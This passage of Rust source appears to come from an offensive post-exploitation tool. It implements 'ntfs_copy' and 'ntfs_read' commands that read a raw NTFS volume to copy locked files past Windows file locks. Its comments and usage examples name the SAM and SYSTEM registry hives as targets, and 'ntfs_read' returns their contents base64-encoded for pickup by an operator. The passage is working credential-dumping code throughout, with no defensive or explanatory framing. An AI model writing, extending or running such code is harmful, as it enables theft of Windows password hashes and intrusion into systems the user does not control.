                unsafe {
                    WriteFile(h, data.as_ptr(), data.len() as u32, &mut written, std::ptr::null_mut());
                }
                Ok(data.len() as u64)
            }
            DataAttrInfo::NonResident { runs, real_size } => {
                let _cs = vol.cluster_size;
                let mut total_written: u64 = 0;
                let mut read_buf = vec![0u8; 16 * 1024]; // 16 KB read buffer

                while total_written < real_size {
                    let to_read = ((real_size - total_written) as usize).min(read_buf.len());
                    let actual = vol.read_data_runs(&runs, total_written, &mut read_buf[..to_read])?;
                    if actual == 0 {
                        break;
                    }
                    let mut written: u32 = 0;
                    let ok = unsafe {
                        WriteFile(h, read_buf.as_ptr(), actual as u32, &mut written, std::ptr::null_mut())
                    };
                    if ok == 0 {
                        return Err(win::last_error("WriteFile"));
                    }
                    total_written += actual as u64;
                }
                Ok(total_written)
            }
        }
    })();

    unsafe { CloseHandle(h); }

    let bytes = result?;
    Ok(format!("[+] {} -> {} ({} bytes)", filename, dest, bytes))
}

// ── Public command interface ──────────────────────────────────────────────

/// `ntfs_copy <filepath1> [filepath2 ...] <savedir>`
///
/// Copies protected files by reading raw NTFS disk. Requires admin.
/// Example: `ntfs_copy C:\Windows\System32\config\SAM C:\Windows\System32\config\SYSTEM C:\Temp`
#[cfg(windows)]
pub fn ntfs_copy(args: &[String]) -> anyhow::Result<String> {
    if args.len() < 2 {
        anyhow::bail!("Usage: ntfs_copy <filepath1> [filepath2 ...] <savedir>\nExample: ntfs_copy C:\\Windows\\System32\\config\\SAM C:\\Temp");
    }

    let save_dir = args.last().unwrap();

    // Validate save directory exists
    let save_dir_w: Vec<u16> = save_dir.encode_utf16().chain(std::iter::once(0)).collect();
    let ftyp = unsafe {
        windows_sys::Win32::Storage::FileSystem::GetFileAttributesW(save_dir_w.as_ptr())
    };
    if ftyp == u32::MAX {
        anyhow::bail!("Save directory '{}' does not exist or is inaccessible", save_dir);
    }
    if ftyp & 0x10 == 0 { // FILE_ATTRIBUTE_DIRECTORY
        anyhow::bail!("'{}' is not a directory", save_dir);
    }

    let mut output = Vec::new();
    let file_paths = &args[..args.len() - 1];

    // Cache open volumes by drive letter
    let mut volumes: std::collections::HashMap<char, NtfsVolume> = std::collections::HashMap::new();

    for file_path in file_paths {
        match copy_single_file(file_path, save_dir, &mut volumes) {
            Ok(msg) => output.push(msg),
            Err(e) => output.push(format!("[!] {}: {}", file_path, e)),
        }
    }

    Ok(output.join("\n"))
}

#[cfg(windows)]
fn copy_single_file(
    file_path: &str,
    save_dir: &str,
    volumes: &mut std::collections::HashMap<char, NtfsVolume>,
) -> anyhow::Result<String> {
    // Parse path: must be absolute (e.g. C:\Windows\System32\config\SAM)
    let path = file_path.replace('/', "\\");
    if path.len() < 3 || &path[1..2] != ":" {
        anyhow::bail!("Only absolute paths supported (e.g. C:\\Windows\\...)");
    }

    let drive_letter = path.chars().next().unwrap().to_uppercase().next().unwrap();

    // Open volume if not already open
    if !volumes.contains_key(&drive_letter) {
        let vol = NtfsVolume::open(drive_letter)?;
        volumes.insert(drive_letter, vol);
    }
    let vol = volumes.get(&drive_letter).unwrap();

    // Split path into components (skip drive letter and colon)
    let rel_path = &path[3..]; // skip "C:\"
    let components: Vec<&str> = rel_path.split('\\').filter(|s| !s.is_empty()).collect();
    if components.is_empty() {
        anyhow::bail!("No file specified in path");
    }

    let filename = *components.last().unwrap();
    let mft_index = resolve_path(vol, &components)?;
    copy_file_to_dir(vol, mft_index, filename, save_dir)
}

/// `ntfs_read <filepath>` — read a locked file and return contents as base64.
/// Useful for small files (SAM, SYSTEM hives) where you want data returned directly.
#[cfg(windows)]
pub fn ntfs_read(args: &[String]) -> anyhow::Result<String> {
    use base64::Engine;

    if args.is_empty() {
        anyhow::bail!("Usage: ntfs_read <filepath>\nExample: ntfs_read C:\\Windows\\System32\\config\\SAM");
    }

    let path = args[0].replace('/', "\\");
    if path.len() < 3 || &path[1..2] != ":" {
        anyhow::bail!("Only absolute paths supported");
    }

    let drive_letter = path.chars().next().unwrap().to_uppercase().next().unwrap();
    let vol = NtfsVolume::open(drive_letter)?;

    let rel_path = &path[3..];
    let components: Vec<&str> = rel_path.split('\\').filter(|s| !s.is_empty()).collect();
    if components.is_empty() {
        anyhow::bail!("No file specified");
    }

    let mft_index = resolve_path(&vol, &components)?;
    let data = read_file_data(&vol, mft_index)?;

    Ok(format!(
        "[+] Read {} bytes from {}\n[base64]\n{}",
        data.len(),
        args[0],
        base64::engine::general_purpose::STANDARD.encode(&data)
    ))
}

#[cfg(not(windows))]
pub fn ntfs_copy(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("ntfs_copy is only available on Windows")
}

#[cfg(not(windows))]
pub fn ntfs_read(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("ntfs_read is only available on Windows")
}
